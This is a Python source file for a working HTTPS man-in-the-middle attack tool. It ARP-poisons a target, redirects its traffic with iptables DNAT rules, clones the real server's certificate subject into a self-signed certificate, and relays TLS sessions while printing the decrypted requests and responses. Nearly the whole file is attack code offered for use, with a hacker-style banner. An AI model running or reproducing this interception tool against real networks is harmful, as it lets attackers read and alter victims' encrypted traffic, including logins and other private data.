import socket
from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR, IPPROTO_IP

#from http.server import HTTPServer, BaseHTTPRequestHandler
#from socket import * # THIS CAUSE PROBLEMS WHY?
#from socket import SOL_IP, IP_TRANSPARENT
import os
import errno

import netifaces as ni
import threading
import traceback
import ssl

from argparse import ArgumentParser

import OpenSSL
from OpenSSL import crypto, SSL
from os.path import exists, join
from io import open

from scapy.all import *

import pprint
import email
from io import StringIO

import arp_spoof

KEYFILE = 'server_key.pem'
CERTFILE = 'server_cert.pem'


import time

version = 0.01
banner="""\n
 ____                _            
|  _ \ __ _ _ __ ___| | ___ _   _ 
| |_) / _` | '__/ __| |/ _ \ | | |
|  __/ (_| | |  \__ \ |  __/ |_| |
|_|   \__,_|_|  |___/_|\___|\__, |
                            |___/ 

"""

def parse_http ( data ):
	fields = data.split("\r\n")
	#fields = fields[1:] #ignore the GET / HTTP/1.1
	output = {}
	'''
	for field in fields:
		print ( )
		#key,value = field.split(':')#split each line by http field name and value
		#output[key] = value
	'''
	#return output
	return fields

# parse command line
def set_configs():
	parser = ArgumentParser()
	#parser.add_argument ( "echo", help="echo the string you use here" )
	#parser.add_argument("-v", "--verbosity", type=int, choices=[0, 1, 2], help="increase output verbosity")
	#parser.add_argument("square", type=int, help="display a square of a given number")

	parser.add_argument ( "-t", "--target", required=True, type=str, help="The target IP" )
	parser.add_argument ( "-s", "--server", required=True, type=str, help="The server IP to spoof" )
	parser.add_argument ( "-i", "--interface", required=True, type=str, help="The interface to use" )

	# parse command line
	args = parser.parse_args()
	'''
	answer = args.square**2
	if args.verbosity == 2:
		print("the square of {} equals {}".format(args.square, answer))
	elif args.verbosity == 1:
		print("{}^2 == {}".format(args.square, answer))
	else:
		print(answer)

	print (args.echo)
	'''
	#print (args)
	# return config dictionary
	conf = { 
		'target' : {
			'ip':args.target,
			'mac':ip_to_mac(args.target,args.interface),
		},
		'server' : {
			'ip':args.server,
			'mac':ip_to_mac(args.server,args.interface),
		},
		'mitm' : {
			'ip': ni.ifaddresses(args.interface)[ni.AF_INET][0]['addr'],
			'mac': ni.ifaddresses(args.interface)[ni.AF_LINK][0]['addr'],
		},
		'interface' : args.interface
	}
	print(conf)
	return conf

def ip_to_mac ( IP, interface ):
	try:
		arp_rq = ARP()
		arp_op = 1 # honest arp request
		arp_rq.hwdst = "ff:ff:ff:ff:ff:ff"
		arp_rq.pdst = IP

		ans, unans = sr ( arp_rq, retry=10, timeout=2, iface = interface, verbose=0 )
		#print (ans)
		#print (unans)
		for snd,rcv in ans:
			return rcv[ARP].underlayer.src

		return None
	except OSError as ose:
		if ( ose.errno == 19 ):
			print("[!] The interface %s does not exist!" % interface)
			#print ( traceback.format_exc() )
			return
		else:
			print ("[!] %s is not a valid IP address!" % IP )
			#print ( traceback.format_exc() )
			return
	except socket.error:
		print ( traceback.format_exc() )
		return


#http://code.activestate.com/recipes/213239-recvall-corollary-to-socketsendall/
def recvall(the_socket,timeout=''):
	#setup to use non-blocking sockets
	#if no data arrives it assumes transaction is done
	#recv() returns a string
	the_socket.setblocking(0)
	total_data=[];data=''
	begin=time.time()
	if not timeout:
		timeout=1 # set 1 second timeout?
	while 1:
		#if you got some data, then break after wait sec
		if total_data and time.time()-begin>timeout:
			break
		#if you got no data at all, wait a little longer
		elif time.time()-begin>timeout*4:
			break
		wait=0
		try:
			data=the_socket.recv(4096)
			data=data.decode()
			if data:
				total_data.append(data)
				begin=time.time()
				data='';wait=0
			else:
				# wait 0.1 from last receive
				time.sleep(0.1)#0.1 default
		except:
			pass
		#When a recv returns 0 bytes, other side has closed
	result=''.join(total_data)
	return result

def iptables_clean ():
	os.system ( "iptables -t nat -F" )

def iptables_accept ( configs ):
	# add an iptables rule to accept incoming packets destined to another node
	#print (configs['mitm']['ip'])
	command = "iptables -t nat -A PREROUTING -d "+configs['server']['ip']+" -j DNAT --to "+configs['mitm']['ip']
	#print (command)
	#os.system ( "iptables -t nat -A PREROUTING -d %configs['target']['ip']% -j DNAT --to %configs['mitm']['ip']%" ) # port will be the one specified in the incoming packet
	os.system ( command )

def start( configs ):
	try:
		print ( banner )
		print ( version )
		# print ( "Ensure that ARP spoofing is running!" )
		
		print ( "[*] Enabling ip forwarding..." )
		# sysctl -w net.ipv4.ip_forward=1
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

		#print("Sleeping...")
		#time.sleep( 50 )

		#print ( "[*] Checking for iptables rules..." )
		
		print ( "[*] Adding iptables rules..." )
		iptables_accept( configs )

		print ( "[*] Cloning server certificate..." )
		cert = _get_cert_from_endpoint ( configs['server']['ip'] )
		#cert = _get_cert_from_endpoint ( "www.google.com" )
		_clone_certificate ( cert )

		spoof_server( configs )
		# spoof_gateway( configs )
		
	except KeyboardInterrupt:
		#print ("\n[!] Ctrl+C: closing program")
		#s.close()
		#f.close()
		iptables_clean()
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		raise
		
	except Exception as e:# Any other error
		print ("\n[!] Error in executing program:" )
		print(traceback.format_exc())
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		iptables_clean()

		# the socket is open? If yes close it
		

def handle_connection( client, server ): # recv and send could fail?? YES if socket get closed!

	#parser = MyHTMLParser()

	# i should open each session for multiple client connection aka a new server connection for each client
	while True: # repeat till connection got closed from client or server
		try:
			# wait req from client
			client_request = recvall ( client )
			if ( client_request ): # i have received data from client
				print ('[*] request received from client:\n')
				print ("request lenght: ", len(client_request) )
				out = parse_http(client_request)
				print(out[0])
				'''
				_, headers = client_request.split('\r\n', 1)
				message = email.message_from_file(StringIO(headers))
				headers = dict(message.items())
				pprint.pprint(headers, width=160)
				'''
				print ("[*] Forwarding to server...")	

				try:
					server.sendall(client_request.encode()) # it fails here? yes, server close connection but i don't see it

					print ("[*] Waiting for response...")

					server_response = ''
					server_response = recvall ( server ) # what if server close connection aka socket? What if i got to wait more?
					if ( server_response ):
						print ('[*] Received packet from server:\n')
						print ("response lenght: ", len(server_response) )
						# what if response is empty?? Should i create a new connection each time? recvall should receive all the data it needs
						re = parse_http( server_response )
						print ( re[0] )

						#forward server response to client
						print ("[*] Forwarding to client...")
						try:
							client.sendall ( server_response.encode() ) 
							# create a thread to handle request
							# thread.start_new_thread(proxy_thread, (conn, client_addr, server))
						except socket.error:
							print ("[!] Client closed connection! Failed to forward response from server!")
							print(traceback.format_exc())
							break
					else:
						print ("[!] No response from the server! Probably he closed the connection")
						break
						#now what?

				except socket.error:
					print ("[!] Server closed connection! Failed to forward data to server!")
					print(traceback.format_exc())
					break
			else: # no data from client ---> connection closed or i got to wait?
				print ("[!] No data from client! Probably he closed the connection..")
				break

				
		except socket.error: # failed in receiving data from client prob the socket got closef
			print ("[!] Client closed connection! Failed to receive request from client!")
			print(traceback.format_exc())
			break
		except KeyboardInterrupt:
			break


def spoof_server ( configs ):
	try:
		s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

		s.bind((configs['mitm']['ip'],443))
		s.listen(5)
		# ssl_version=ssl.PROTOCOL_SSLv23 ssl.PROTOCOL_TLS
		sslsocket = ssl.wrap_socket ( s, server_side = True, keyfile=KEYFILE, certfile=CERTFILE, do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )

		print ("[*] Listening on port 443..")
		
		while True:
			try:

				f = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
				wrap_f = ssl.wrap_socket ( f, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )

				print("[*] Connecting to server...")
				wrap_f.connect(( configs['server']['ip'], 443)) # connecting using 202 source IP
				print("[*] Connection enstablished!")


				#c, addr = s.accept()
				# https://issues.apache.org/jira/browse/THRIFT-4274
				c, addr = sslsocket.accept()

				# ok i have a connection with victim client on secure socket c
				# since victim client is connecting with me i spoofed real server IP so i know the server name, otherwise i spoofed the gateway...
				# if i spoofed the gw i needed to go deep since routers don't use L4 but only L3 ( IP ), basically i can't create a socket SOCK_STREAM and wrap a ssl to it
				# since method itself says that only SOCK_STREAM sockets are supported
				# which means i have finished my tcp and tls handshake with him now he sended me some data to be forwarded to server faking the client requests
				print ("\n[*] Received connection from: ", addr)

				handle_connection ( c, wrap_f )

				# i should be sure the 2 finished communicating
				print ("[*] Closing connection with client...")
				print ("[*] Closing connection with server...")
				wrap_f.close()
				c.close()

			except socket.error as e:
				# if error is 0 means client closed connection and i only need to relisten and stay cool, failed to accept connection
				if ( e.errno == 0 ): 
					print ("[!] It seems the client closed the connection! ReListening...")
					wrap_f.close()
					continue
				else:
					# ssl.SSLError
					print ("\n[!] Error in accepting secure connection from client or server:" )
					print(traceback.format_exc())
					# print(sys.exc_info()[0]) # ERROR sys not defined python3
					#print ( e )
					print ("Socket error({0}): {1}".format(e.errno, e.strerror))
					print ( os.strerror( e.errno ) )
					iptables_clean()
					os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
					#s.close() # do i need to close wrapped one?
					c.close()
					sslsocket.close()
					break
			except KeyboardInterrupt:
				sslsocket.close()
				c.close()
				raise
	# disabled promiscuous mode
	# s.ioctl(s.SIO_RCVALL, s.RCVALL_OFF)
	except KeyboardInterrupt:
		sslsocket.close()
		raise

	except socket.error as v: # as python3 --> , python2
		# there could be many different socket errors 
		print ("\n[!] Error in sockets handling:" )
		#print ( "errno no: ", v[0] ) # ERROR IN THE ERROR python3
		print(traceback.format_exc())
		# print(sys.exc_info()[0]) #ERROR sys not defined
		iptables_clean()
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def gateway_forward ( configs ):
	def sniff( packet ):
		print ( "RECEIVED:\n",packet.show() )
		'''
		i received a packet that gateway should have.. I must simple reforward to gw using scapy --> this bypass kernel
		'''
		# change destination mac ----> must recalculate checksum and stuff? I GUESS SO
		packet[Ether].dst = configs['server']['mac']
		print ( "MODIFIED:\n",packet.show() )
		srp1( packet, iface=configs['interface'] ) # send packet at L3 da fuck dus that mean
	return sniff

def spoof_gateway( configs ):

	#command = "iptables -t nat -A PREROUTING -d "+configs['server']['ip']+" -j DNAT --to "+configs['mitm']['ip']
	#os.system( command )
	fil = "tcp and port 443 and src host " + configs['target']['ip']
	print (fil)
	#packet=sniff(iface=configs['interface'],filter=fil, prn=lambda x:x.sprintf("{IP:%IP.src% (%Ether.src%)\t--->\t%IP.dst% (%Ether.dst%):\t%TCP.sport%\t--->\t%TCP.dport%}" ) )
	packet=sniff(iface=configs['interface'],filter=fil, prn=gateway_forward( configs )  )

def create_cert(server_subj, cert_dir):
	#if not exists(join(cert_dir, CERTFILE)) \
	#or not exists(join(cert_dir, KEYFILE)):
	print ("Creating server key and cert..")
	#create key pair
	k = crypto.PKey()
	k.generate_key(crypto.TYPE_RSA, 1024)

	#create self signed certificate
	cert = crypto.X509()
	cert.set_serial_number(1000)
	#cert.get_subject().CN = "localhost" # TO CHANGE
	cert.set_subject( server_subj ) 
	cert.gmtime_adj_notBefore(0)
	cert.gmtime_adj_notAfter(10*365*24*60*60)
	cert.set_pubkey(k)
	cert.set_issuer(cert.get_subject()) # autosigned aka root CA ---> localhost?
	cert.sign(k, 'sha256')

	#create files
	open(join(cert_dir, CERTFILE), "wb").write(
	crypto.dump_certificate(crypto.FILETYPE_PEM, cert))

	open(join(cert_dir, KEYFILE ), "wb").write(
	crypto.dump_privatekey (crypto.FILETYPE_PEM, k   ))


def _clone_certificate ( cert ):
	# loading certificate in x509 object
	# Load a certificate (X509) from the string buffer encoded with the type type.
	x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
	# what do i need to clone a certificate? What do i need to modify?
	# class OpenSSL.crypto.X509: An X.509 certificate.
	# X.509 object ----> get_subject() ----> Return the subject of this certificate. This creates a new X509Name that wraps the underlying subject name field on the certificate. 
	# X.509 Distinguished Name ---> get_components(): Returns the components of this name, as a sequence of 2-tuples.
	# print ( x509.get_subject().get_components() )
	create_cert ( x509.get_subject(), "." )
	print ( x509.get_subject() )
	return cert
 
def _get_cert_from_endpoint(server, port=443):
	try:
		cert = ssl.get_server_certificate((server, port))
		#print (cert)
	except Exception:
		#log.error('Unable to retrieve certificate from {0}'.format(server))
		print ( "[!] Error in getting server certificate!" )
		cert = None
	if not cert:
		return None
	return cert

def main():
	try:
		configs = set_configs()
		#print ( configs['target']['ip'] )
		arp = threading.Thread( target=arp_spoof.poison, args=[ configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['mitm']['mac'] ] )  
		arp.setDaemon(True)
		arp.start() #ARP spoofing
		#time.sleep(10)

		start( configs )
	except KeyboardInterrupt:
		print ("\n[!] Ctrl+C: closing program")
		print ("\n[*] Antitode target..")
		arp_spoof.antitode( configs['target']['ip'], configs['target']['mac'], configs['server']['ip'], configs['server']['mac'] )

if __name__ == '__main__' :
	main()

